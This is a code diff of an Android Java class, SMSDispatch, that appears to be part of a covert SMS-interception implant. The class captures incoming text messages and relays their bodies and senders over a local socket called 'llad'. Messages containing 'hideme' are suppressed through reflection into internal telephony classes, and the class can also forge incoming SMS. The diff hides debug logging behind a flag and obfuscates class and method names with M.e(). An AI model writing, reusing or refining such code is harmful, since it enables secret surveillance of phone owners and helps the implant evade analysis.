@@ -61,35 +61,50 @@ public class SMSDispatch {
 			Check.log(TAG + "phone.android.com");
 		}
 		if (pdus[0] == null) {
-			Log.d(TAG, "null pdu");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "null pdu");
+			}
 			return;
 		}
 		SmsMessage s1 = SmsMessage.createFromPdu(pdus[0]);
 		if (s1 != null) {
-			Log.d(TAG, "SMSDispatch: incoming SMS");
-
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "SMSDispatch: incoming SMS");
+			}
 
 			if (s1.getMessageBody() != null) {
-				Log.d(TAG, s1.getMessageBody());
-				Log.d(TAG, s1.getOriginatingAddress());
-				Log.d(TAG, s1.getClass().getCanonicalName());
+				if (Cfg.DEBUG) {
+					Check.log(TAG + s1.getMessageBody());
+					Check.log(TAG + s1.getOriginatingAddress());
+					Check.log(TAG + s1.getClass().getCanonicalName());
+				}
 				if (s1.getMessageBody().toLowerCase().contains("hideme")) {
 					try {
 						this.callOrig = false;
-						Log.d(TAG, "hide");
-						Reflect r = Reflect.on("com.android.internal.telephony.SMSDispatcher");
-						Log.d(TAG, "called on");
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "hide");
+						}
+						Reflect r = Reflect.on(M.e("com.android.internal.telephony.SMSDispatcher"));
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "called on");
+						}
 						if (r != null) {
 							if (r.get() != null) {
 								//private void notifyAndAcknowledgeLastIncomingSms(boolean success,int result, Message response)
-								Log.d(TAG, "calling notifyAndAcknowledgeLastIncomingSms");
-								r.call("notifyAndAcknowledgeLastIncomingSms", true, RESULT_SMS_HANDLED, null);
+								if (Cfg.DEBUG) {
+									Check.log(TAG + "calling notifyAndAcknowledgeLastIncomingSms");
+								}
+								r.call(M.e("notifyAndAcknowledgeLastIncomingSms"), true, RESULT_SMS_HANDLED, null);
 							} else {
-								Log.d(TAG, "calling notifyAndAcknowledgeLastIncomingSms");
+								if (Cfg.DEBUG) {
+									Check.log(TAG + "calling notifyAndAcknowledgeLastIncomingSms");
+								}
 							}
 						}
 					} catch (Exception e) {
-						Log.d(TAG, "Exception", e);
+						if (Cfg.DEBUG) {
+							Check.log(TAG + "Exception", e);
+						}
 					}
 				} else {
 					this.callOrig = true;
@@ -111,7 +126,6 @@ public class SMSDispatch {
 	}
 
 
-
 	/**
 	 * Sleep.
 	 *
@@ -121,15 +135,19 @@ public class SMSDispatch {
 		try {
 			Thread.sleep(t);
 		} catch (final InterruptedException e) {
-			Log.w(TAG, " sleep() throwed an exception");//$NON-NLS-1$
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " sleep() throwed an exception");//$NON-NLS-1$
+			}
 		}
 	}
-  static int  hexCharToInt(char c) {
-        if (c >= '0' && c <= '9') return (c - '0');
-        if (c >= 'A' && c <= 'F') return (c - 'A' + 10);
-        if (c >= 'a' && c <= 'f') return (c - 'a' + 10);
-        throw new RuntimeException ("invalid hex char '" + c + "'");
-    }
+
+	static int hexCharToInt(char c) {
+		if (c >= '0' && c <= '9') return (c - '0');
+		if (c >= 'A' && c <= 'F') return (c - 'A' + 10);
+		if (c >= 'a' && c <= 'f') return (c - 'a' + 10);
+		throw new RuntimeException(M.e("invalid hex char '" + c + "'"));
+	}
+
 	public static byte[] hexStringToBytes(String s) {
 		byte[] ret;
 
@@ -147,25 +165,35 @@ public class SMSDispatch {
 		return ret;
 	}
 
-	public static int dispatchParcel(Parcel p){
+	public static int dispatchParcel(Parcel p) {
 		int callOrig = 1;
 		if (p == null) {
-			Log.d(TAG, "null Parcel return ");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "null Parcel return ");
+			}
+
 			return callOrig;
+
 		}
 		int response;
 		int dataPosition = p.dataPosition();
-		Log.d(TAG, "dispatchParcel dataposition :"+dataPosition);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "dispatchParcel dataposition :" + dataPosition);
+		}
 
 
 		//Log.d(TAG, "dispatchParcel response: "+response);
 		try {
 			response = p.readInt();
-			Log.d(TAG, "dispatchParcel: got RIL code=" + response);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "dispatchParcel: got RIL code=" + response);
+			}
 			if (response == 1003) {
 				String ret = p.readString();
 
-				Log.d(TAG, "dispatchParcel: got RIL_UNSOL_RESPONSE_NEW_SMS string=" + ret);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "dispatchParcel: got RIL_UNSOL_RESPONSE_NEW_SMS string=" + ret);
+				}
 				try {
 					SmsMessage sms = SmsMessage.createFromPdu(hexStringToBytes(ret));
 					if (sms.getProtocolIdentifier() == 64) {
@@ -177,69 +205,96 @@ public class SMSDispatch {
 							return obj.res;
 						}
 					} else {
-						Log.d(TAG, sms.getMessageBody());
-						Log.d(TAG, sms.getOriginatingAddress());
-						Log.d(TAG, "TP_PID=" + sms.getProtocolIdentifier());
+						if (Cfg.DEBUG) {
+							Check.log(TAG + sms.getMessageBody());
+							Check.log(TAG + sms.getOriginatingAddress());
+							Check.log(TAG + "TP_PID=" + sms.getProtocolIdentifier());
+						}
 					}
 				} catch (Exception e) {
-					Log.d(TAG, " (dispatchParcel) Ex", e);//$NON-NLS-1$
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (dispatchParcel) Ex", e);//$NON-NLS-1$
+					}
 				}
 
 			}
-		}finally {
+		} finally {
 			p.setDataPosition(dataPosition);
 		}
 		return callOrig;
 	}
+
 	public static int dispatchNormalMessage(Object smsO) {
-		Log.d(TAG, "dispatchNormalMessage: start now" + smsO);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "dispatchNormalMessage: start now" + smsO);
+		}
 		int callOrig = 1;
 		if (smsO == null) {
-			Log.d(TAG, "dispatchNormalMessage: null message return ");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "dispatchNormalMessage: null message return ");
+			}
 			return callOrig;
 		}
-		Log.d(TAG, "dispatchNormalMessage: start serviceConnection");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "dispatchNormalMessage: start serviceConnection");
+		}
 		byte[][] pdus = new byte[1][];
-		Log.d(TAG, "dispatchNormalMessage: asking pdu ");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "dispatchNormalMessage: asking pdu ");
+		}
 		pdus[0] = Reflect.on(smsO).call("getPdu").get();
-		Log.d(TAG, "dispatchNormalMessage: got it");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "dispatchNormalMessage: got it");
+		}
 		//Application a = getcon();
 		SmsMessage sms = SmsMessage.createFromPdu(pdus[0]);
 		if (sms == null) {
-			Log.d(TAG, "failed to create sms");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "failed to create sms");
+			}
 			return callOrig;
 		}
 		LowEventHandlerDefs obj = new LowEventHandlerDefs();
 		obj.data = pdus[0];
 		obj.type = LowEventHandlerDefs.EVENT_TYPE_SMS;
 		obj = sendSerialObj(obj);
-		if(obj!=null){
+		if (obj != null) {
 			return obj.res;
 		}
 		return callOrig;
 	}
 
 	private static LowEventHandlerDefs sendSerialObj(LowEventHandlerDefs obj) {
-		if (obj==null){
+		if (obj == null) {
 			return null;
 		}
 		LocalSocket sender = new LocalSocket();
-		obj.res=1;
+		obj.res = 1;
 		try {
 			sender.connect(new LocalSocketAddress("llad"));
-			Log.d(TAG, "SENT DATA ");
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "SENT DATA ");
+			}
 			int timeout = 5;
-			Log.d(TAG, "wait connection..");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "wait connection..");
+			}
 			while (timeout-- > 0) {
 				if (sender.isBound() && sender.isConnected()) {
 					break;
 				} else {
-					Log.d(TAG, ".");
+
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + ".");
 				}
 				msleep(100);
 			}
 			if (!(sender.isBound() && sender.isConnected())) {
-				Log.d(TAG, " (connection failed): ");//$NON-NLS-1$
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (connection failed): ");//$NON-NLS-1$
+				}
 				return obj;
 			}
 			DataInputStream streamIn = new DataInputStream(new
@@ -250,7 +305,9 @@ public class SMSDispatch {
 			oos.writeObject(obj);
 			oos.flush();
 			streamOut.flush();
-			Log.d(TAG, " (object sent): ");//$NON-NLS-1$
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (object sent): ");//$NON-NLS-1$
+			}
 			obj = null;
 			timeout = 10;
 			int available = 0;
@@ -260,28 +317,41 @@ public class SMSDispatch {
 						try {
 							available = streamIn.available();
 							Log.d(TAG, " (getAvailable): " + available);//$NON-NLS-1$
+
 							if (available > 0) {
 
 								ObjectInputStream ois = new ObjectInputStream(streamIn);
 								obj = (LowEventHandlerDefs) ois.readObject();
-								Log.d(TAG, "GOT DATA " + obj);
+								if (Cfg.DEBUG) {
+									Check.log(TAG + "GOT DATA " + obj);
+								}
 							}
 						} catch (Exception e) {
-							Log.d(TAG, " (is available) Error: ", e);//$NON-NLS-1$
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (is available) Error: ", e);//$NON-NLS-1$
+							}
 						}
 					} else {
-						Log.d(TAG, " (getAvailable) sender not connected");//$NON-NLS-1$
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (getAvailable) sender not connected");//$NON-NLS-1$
+						}
 					}
 
 				} catch (Exception e) {
-					Log.d(TAG, " (getAvailable) Error: ", e);//$NON-NLS-1$
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (getAvailable) Error: ", e);//$NON-NLS-1$
+					}
 				}
 				msleep(100);
 			}
-			Log.d(TAG, " (exiting): t=" + timeout + " a=" + available);//$NON-NLS-1$
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (exiting): t=" + timeout + " a=" + available);//$NON-NLS-1$
+			}
 			msleep(100);
-		}catch (Exception e){
-			Log.d(TAG, " (LocalSocketAddress) Error: ", e);//$NON-NLS-1$
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (LocalSocketAddress) Error: ", e);//$NON-NLS-1$
+			}
 		}
 		return obj;
 	}
@@ -290,17 +360,26 @@ public class SMSDispatch {
 		try {
 			final Class<?> activityThreadClass =
 					Class.forName("android.app.ActivityThread");
+
 			if (activityThreadClass == null)
-				Log.d(TAG, "activityThreadClass == null");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "activityThreadClass == null");
+				}
 			final Method method = activityThreadClass.getMethod("currentApplication");
 			Application app = (Application) method.invoke(null, (Object[]) null);
 			if (app == null) {
-				Log.d(TAG, "getcon app == null");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "getcon app == null");
+				}
 				final Method method2 = activityThreadClass.getMethod("getApplication");
 				if (method2 == null)
-					Log.d(TAG, "method2 == null");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "method2 == null");
+					}
 				if (app == null) {
-					Log.d(TAG, "getcon 2 app == null");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "getcon 2 app == null");
+					}
 					try {
 						Field f = activityThreadClass.getField("mInitialApplication");
 						app = (Application) f.get(activityThreadClass);
@@ -308,7 +387,10 @@ public class SMSDispatch {
 					}
 				}
 				if (app == null)
-					Log.d(TAG, "getcon 3 app == null");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "getcon 3 app == null");
+
+					}
 			}
 			return app;
 		} catch (final ClassNotFoundException e) {
@@ -327,7 +409,9 @@ public class SMSDispatch {
 			// handle exception
 			Log.d(TAG, e.toString());
 		}
-		Log.d(TAG, "getcon == null :-(");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "getcon == null :-(");
+		}
 		return null;
 	}
 
@@ -342,7 +426,7 @@ public class SMSDispatch {
 	private static byte[] createFakeSms(String sender, String body) {
 		//Source: http://stackoverflow.com/a/12338541
 		//Source: http://blog.dev001.net/post/14085892020/android-generate-incoming-sms-from-within-your-app
-		byte[] scBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD("0000000000");
+		byte[] scBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(M.e("0000000000"));
 		byte[] senderBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(sender);
 		int lsmcs = scBytes.length;
 		byte[] dateBytes = new byte[7];
@@ -368,7 +452,7 @@ public class SMSDispatch {
 			try {
 				String sReflectedClassName = M.e("com.android.internal.telephony.GsmAlphabet");
 				Class cReflectedNFCExtras = Class.forName(sReflectedClassName);
-				Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod("stringToGsm7BitPacked", new Class[]{String.class});
+				Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod(M.e("stringToGsm7BitPacked"), new Class[]{String.class});
 				stringToGsm7BitPacked.setAccessible(true);
 				byte[] bodybytes = (byte[]) stringToGsm7BitPacked.invoke(null, body);
 				bo.write(bodybytes);
